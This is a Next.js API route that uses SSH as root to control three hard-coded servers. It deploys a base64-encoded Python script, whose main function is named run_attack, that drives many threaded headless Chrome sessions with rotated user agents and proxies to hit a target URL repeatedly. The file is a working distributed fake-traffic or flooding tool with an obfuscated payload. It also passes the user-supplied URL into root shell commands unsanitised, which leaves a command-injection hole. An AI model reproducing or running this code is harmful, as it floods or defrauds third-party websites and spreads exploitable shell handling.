import { NextResponse } from 'next/server';
import { Client } from 'ssh2';

const DEFAULT_SERVERS = [
  { host: '138.68.153.135', username: 'root' },
  { host: '188.166.159.196', username: 'root' },
  { host: '46.101.78.167', username: 'root' }
];

const PYTHON_SCRIPT_B64 = "ZnJvbSBEcmlzc2lvblBhZ2UgaW1wb3J0IENocm9taXVtUGFnZSwgQ2hyb21pdW1PcHRpb25zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHJhbmRvbQppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBqc29uCgp2aXNpdF9jb3VudCA9IDAKZXJyb3JfY291bnQgPSAwCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpClNUQVRVU19GSUxFID0gIi9yb290L3Zpc2l0X3N0YXR1cy5qc29uIgoKZGVmIHdyaXRlX3N0YXR1cyhtYXhfdmlzaXRvcnMsIGR1cmF0aW9uX21pbnV0ZXMsIHN0YXJ0X3RpbWUsIHN0YXR1cz0icnVubmluZyIpOgogICAgZ2xvYmFsIHZpc2l0X2NvdW50LCBlcnJvcl9jb3VudAogICAgZWxhcHNlZCA9IGludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpCiAgICB0b3RhbF9zZWNvbmRzID0gZHVyYXRpb25fbWludXRlcyAqIDYwCiAgICByZW1haW5pbmcgPSBtYXgoMCwgdG90YWxfc2Vjb25kcyAtIGVsYXBzZWQpCiAgICBwcm9ncmVzcyA9IG1pbigxMDAsIHJvdW5kKCh2aXNpdF9jb3VudCAvIG1heF92aXNpdG9ycykgKiAxMDAsIDEpKSBpZiBtYXhfdmlzaXRvcnMgPiAwIGVsc2UgMAogICAgZGF0YSA9IHsKICAgICAgICAic3RhdHVzIjogc3RhdHVzLAogICAgICAgICJ2aXNpdHMiOiB2aXNpdF9jb3VudCwKICAgICAgICAidGFyZ2V0IjogbWF4X3Zpc2l0b3JzLAogICAgICAgICJwcm9ncmVzcyI6IHByb2dyZXNzLAogICAgICAgICJlbGFwc2VkIjogZWxhcHNlZCwKICAgICAgICAicmVtYWluaW5nIjogcmVtYWluaW5nLAogICAgICAgICJlcnJvcnMiOiBlcnJvcl9jb3VudCwKICAgICAgICAidGltZXN0YW1wIjogaW50KHRpbWUudGltZSgpKQogICAgfQogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihTVEFUVVNfRklMRSwgInciKSBhcyBmOgogICAgICAgICAgICBqc29uLmR1bXAoZGF0YSwgZikKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgpkZWYgY3JlYXRlX2Jyb3dzZXIocHJveHk9Tm9uZSk6CiAgICBjbyA9IENocm9taXVtT3B0aW9ucygpCiAgICBjby5zZXRfYXJndW1lbnQoJy0taGVhZGxlc3M9bmV3JykKICAgIGNvLnNldF9hcmd1bWVudCgnLS1uby1zYW5kYm94JykKICAgIGNvLnNldF9hcmd1bWVudCgnLS1kaXNhYmxlLWdwdScpCiAgICBjby5zZXRfYXJndW1lbnQoJy0tYmxpbmstc2V0dGluZ3M9aW1hZ2VzRW5hYmxlZD1mYWxzZScpCiAgICBjby5zZXRfYXJndW1lbnQoJy0tZGlzYWJsZS1leHRlbnNpb25zJykKICAgIGNvLnNldF9hcmd1bWVudCgnLS1kaXNhYmxlLWRldi1zaG0tdXNhZ2UnKQogICAgY28uc2V0X2FyZ3VtZW50KCctLWRpc2FibGUtbG9nZ2luZycpCiAgICBjby5zZXRfYXJndW1lbnQoJy0tZGlzYWJsZS1kZWZhdWx0LWFwcHMnKQogICAgY28uc2V0X2FyZ3VtZW50KCctLW5vLWZpcnN0LXJ1bicpCiAgICBjby5zZXRfYXJndW1lbnQoJy0tZGlzYWJsZS1iYWNrZ3JvdW5kLW5ldHdvcmtpbmcnKQogICAgY28uc2V0X2FyZ3VtZW50KCctLWRpc2FibGUtc3luYycpCiAgICBjby5zZXRfYXJndW1lbnQoJy0tZGlzYWJsZS10cmFuc2xhdGUnKQogICAgY28uc2V0X2FyZ3VtZW50KCctLW11dGUtYXVkaW8nKQogICAgY28uc2V0X2FyZ3VtZW50KCctLW5vLXp5Z290ZScpCiAgICBjby5zZXRfYXJndW1lbnQoJy0tc2luZ2xlLXByb2Nlc3MnKQogICAgY28uc2V0X2FyZ3VtZW50KCctLWRpc2FibGUtZmVhdHVyZXM9VHJhbnNsYXRlVUknKQogICAgY28uc2V0X2FyZ3VtZW50KCctLWRpc2FibGUtaXBjLWZsb29kaW5nLXByb3RlY3Rpb24nKQogICAgaWYgcHJveHk6CiAgICAgICAgY28uc2V0X2FyZ3VtZW50KGYnLS1wcm94eS1zZXJ2ZXI9e3Byb3h5WyJob3N0Il19Ontwcm94eVsicG9ydCJdfScpCiAgICBhZ2VudHMgPSBbCiAgICAgICAgJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjAuMC4wLjAgU2FmYXJpLzUzNy4zNicsCiAgICAgICAgJ01vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTkuMC4wLjAgU2FmYXJpLzUzNy4zNicsCiAgICAgICAgJ01vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExOC4wLjAuMCBTYWZhcmkvNTM3LjM2JywKICAgICAgICAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTA5LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTE5LjAnLAogICAgICAgICdNb3ppbGxhLzUuMCAoaVBob25lOyBDUFUgaVBob25lIE9TIDE3XzAgbGlrZSBNYWMgT1MgWCkgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzE3LjAgTW9iaWxlLzE1RTE0OCBTYWZhcmkvNjA0LjEnLAogICAgXQogICAgY28uc2V0X3VzZXJfYWdlbnQocmFuZG9tLmNob2ljZShhZ2VudHMpKQogICAgcmV0dXJuIENocm9taXVtUGFnZShhZGRyX29yX29wdHM9Y28pCgpkZWYgd29ya2VyKHdvcmtlcl9pZCwgdGFyZ2V0X3VybCwgbWF4X3Zpc2l0cywgZW5kX3RpbWUsIHN0YXJ0X3RpbWUsIGR1cmF0aW9uX21pbnV0ZXMsIHByb3hpZXMpOgogICAgZ2xvYmFsIHZpc2l0X2NvdW50LCBlcnJvcl9jb3VudAogICAgdHJ5OgogICAgICAgIHByb3h5ID0gcmFuZG9tLmNob2ljZShwcm94aWVzKSBpZiBwcm94aWVzIGVsc2UgTm9uZQogICAgICAgIHBhZ2UgPSBjcmVhdGVfYnJvd3Nlcihwcm94eSkKICAgICAgICB3aGlsZSB0aW1lLnRpbWUoKSA8IGVuZF90aW1lOgogICAgICAgICAgICB3aXRoIGxvY2s6CiAgICAgICAgICAgICAgICBpZiB2aXNpdF9jb3VudCA+PSBtYXhfdmlzaXRzOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICB2aXNpdF9jb3VudCArPSAxCiAgICAgICAgICAgICAgICBjdXJyZW50ID0gdmlzaXRfY291bnQKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcGFnZS5nZXQodGFyZ2V0X3VybCkKICAgICAgICAgICAgICAgIGlmIGN1cnJlbnQgJSAyMCA9PSAwOgogICAgICAgICAgICAgICAgICAgIHdyaXRlX3N0YXR1cyhtYXhfdmlzaXRzLCBkdXJhdGlvbl9taW51dGVzLCBzdGFydF90aW1lLCAicnVubmluZyIpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHdpdGggbG9jazoKICAgICAgICAgICAgICAgICAgICBlcnJvcl9jb3VudCArPSAxCiAgICAgICAgcGFnZS5xdWl0KCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICB3aXRoIGxvY2s6CiAgICAgICAgICAgIGVycm9yX2NvdW50ICs9IDEKCmRlZiBydW5fYXR0YWNrKHRhcmdldF91cmwsIG1heF92aXNpdG9ycz0xMDAsIGR1cmF0aW9uX21pbnV0ZXM9NSwgcHJveGllcz1Ob25lKToKICAgIGdsb2JhbCB2aXNpdF9jb3VudCwgZXJyb3JfY291bnQKICAgIHZpc2l0X2NvdW50ID0gMAogICAgZXJyb3JfY291bnQgPSAwCgogICAgdG90YWxfc2Vjb25kcyA9IGR1cmF0aW9uX21pbnV0ZXMgKiA2MAogICAgbnVtX3RocmVhZHMgPSBtaW4oNDAsIG1heCg1LCBtYXhfdmlzaXRvcnMgLy8gMjApKQoKICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnRpbWUoKQogICAgd3JpdGVfc3RhdHVzKG1heF92aXNpdG9ycywgZHVyYXRpb25fbWludXRlcywgc3RhcnRfdGltZSwgInN0YXJ0aW5nIikKCiAgICBwcm94eV9pbmZvID0gZiIgfCBQcm94aWVzOiB7bGVuKHByb3hpZXMpfSIgaWYgcHJveGllcyBlbHNlICIgfCBObyBwcm94eSIKICAgIHByaW50KGYiU3RhcnRpbmc6IHttYXhfdmlzaXRvcnN9IHZpc2l0b3JzIGluIHtkdXJhdGlvbl9taW51dGVzfSBtaW4gfCB7bnVtX3RocmVhZHN9IHRocmVhZHN7cHJveHlfaW5mb30iKQoKICAgIGVuZF90aW1lID0gdGltZS50aW1lKCkgKyB0b3RhbF9zZWNvbmRzCiAgICB0aHJlYWRzID0gW10KICAgIGZvciBpIGluIHJhbmdlKG51bV90aHJlYWRzKToKICAgICAgICB0ID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9d29ya2VyLCBhcmdzPShpLCB0YXJnZXRfdXJsLCBtYXhfdmlzaXRvcnMsIGVuZF90aW1lLCBzdGFydF90aW1lLCBkdXJhdGlvbl9taW51dGVzLCBwcm94aWVzIG9yIFtdKSkKICAgICAgICB0LmRhZW1vbiA9IFRydWUKICAgICAgICB0LnN0YXJ0KCkKICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgIHRpbWUuc2xlZXAoMC4zKQoKICAgIHdoaWxlIGFueSh0LmlzX2FsaXZlKCkgZm9yIHQgaW4gdGhyZWFkcyk6CiAgICAgICAgd3JpdGVfc3RhdHVzKG1heF92aXNpdG9ycywgZHVyYXRpb25fbWludXRlcywgc3RhcnRfdGltZSwgInJ1bm5pbmciKQogICAgICAgIHRpbWUuc2xlZXAoMikKCiAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgIHQuam9pbih0aW1lb3V0PTUpCgogICAgd3JpdGVfc3RhdHVzKG1heF92aXNpdG9ycywgZHVyYXRpb25fbWludXRlcywgc3RhcnRfdGltZSwgImZpbmlzaGVkIikKICAgIHByaW50KGYiRmluaXNoZWQhIFRvdGFsOiB7dmlzaXRfY291bnR9IHZpc2l0cyBpbiB7ZHVyYXRpb25fbWludXRlc30gbWludXRlcyB8IEVycm9yczoge2Vycm9yX2NvdW50fSIpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgdXJsID0gc3lzLmFyZ3ZbMV0gaWYgbGVuKHN5cy5hcmd2KSA+IDEgZWxzZSAiaHR0cDovL2V4YW1wbGUuY29tIgogICAgdmlzaXRvcnMgPSBpbnQoc3lzLmFyZ3ZbMl0pIGlmIGxlbihzeXMuYXJndikgPiAyIGVsc2UgMTAwCiAgICBkdXJhdGlvbiA9IGludChzeXMuYXJndlszXSkgaWYgbGVuKHN5cy5hcmd2KSA+IDMgZWxzZSA1CiAgICBwcm94eV9maWxlID0gc3lzLmFyZ3ZbNF0gaWYgbGVuKHN5cy5hcmd2KSA+IDQgZWxzZSBOb25lCgogICAgcHJveGllcyA9IFtdCiAgICBpZiBwcm94eV9maWxlOgogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKHByb3h5X2ZpbGUsICdyJykgYXMgZjoKICAgICAgICAgICAgICAgIHByb3hpZXMgPSBqc29uLmxvYWQoZikKICAgICAgICAgICAgcHJpbnQoZiJMb2FkZWQge2xlbihwcm94aWVzKX0gcHJveGllcyIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgiRmFpbGVkIHRvIGxvYWQgcHJveGllcywgcnVubmluZyB3aXRob3V0IHByb3h5IikKCiAgICBydW5fYXR0YWNrKHVybCwgdmlzaXRvcnMsIGR1cmF0aW9uLCBwcm94aWVzIGlmIHByb3hpZXMgZWxzZSBOb25lKQo=";

const SETUP_COMMAND = 'apt update -y && apt upgrade -y && apt install -y python3 python3-pip wget gnupg2 libnss3 libatk-bridge2.0-0 libcups2 libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libgbm1 libasound2 fonts-liberation libappindicator3-1 xdg-utils && wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt install -y ./google-chrome-stable_current_amd64.deb && rm -f google-chrome-stable_current_amd64.deb && pip3 install DrissionPage && echo "SETUP_COMPLETE"';

// Fire-and-forget: connect, send command, get first line of output, disconnect immediately
async function fireAndForget(server, command) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    const timer = setTimeout(() => {
      try { conn.end(); } catch(e) {}
      resolve('Command sent (timeout)');
    }, 8000);

    conn.on('ready', () => {
      conn.exec(command, (err, stream) => {
        if (err) {
          clearTimeout(timer);
          try { conn.end(); } catch(e) {}
          return reject(err);
        }
        let output = '';
        let done = false;
        stream.on('data', (data) => {
          output += data.toString();
          // As soon as we get output with echo, resolve
          if (!done && output.includes('\n')) {
            done = true;
            clearTimeout(timer);
            try { conn.end(); } catch(e) {}
            resolve(output.trim());
          }
        });
        stream.on('close', () => {
          if (!done) {
            done = true;
            clearTimeout(timer);
            try { conn.end(); } catch(e) {}
            resolve(output.trim() || 'Command executed');
          }
        });
        stream.stderr.on('data', () => {}); // ignore stderr
      });
    }).on('error', (err) => {
      clearTimeout(timer);
      reject(err);
    }).connect({
      host: server.host,
      port: 22,
      username: server.username,
      password: process.env.VPS_PASSWORD,
      readyTimeout: 5000,
    });
  });
}

export async function POST(req) {
  try {
    const { action, url, visitors, duration, servers, proxies } = await req.json();
    const serverList = (servers && servers.length > 0) ? servers : DEFAULT_SERVERS;

    // Build command for each action
    const getCommand = () => {
      if (action === 'setup') {
        return `nohup bash -c '${SETUP_COMMAND}' > /root/setup.log 2>&1 & echo "Setup started"`;
      } else if (action === 'deploy') {
        return `echo "${PYTHON_SCRIPT_B64}" | base64 -d > /root/visit.py && echo "Script deployed successfully"`;
      } else if (action === 'start') {
        if (!url) throw new Error("URL is required");
        const v = visitors || 100;
        const d = duration || 5;
        // Write proxies as a separate step if needed
        if (proxies && proxies.length > 0) {
          const proxyB64 = Buffer.from(JSON.stringify(proxies)).toString('base64');
          return `echo "${proxyB64}" | base64 -d > /root/proxies.json && nohup python3 /root/visit.py "${url}" ${v} ${d} /root/proxies.json > /root/visit.log 2>&1 & echo "Started"`;
        }
        return `nohup python3 /root/visit.py "${url}" ${v} ${d} > /root/visit.log 2>&1 & echo "Started"`;
      } else if (action === 'stop') {
        return `pkill -f visit.py 2>/dev/null; echo "Stopped"`;
      } else {
        throw new Error("Unknown action");
      }
    };

    const command = getCommand();

    // Execute on ALL servers in PARALLEL
    const results = await Promise.all(
      serverList.map(async (server) => {
        try {
          const output = await fireAndForget(server, command);
          return { host: server.host, status: 'success', output };
        } catch (error) {
          return { host: server.host, status: 'error', error: error.message };
        }
      })
    );

    return NextResponse.json({ results });
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
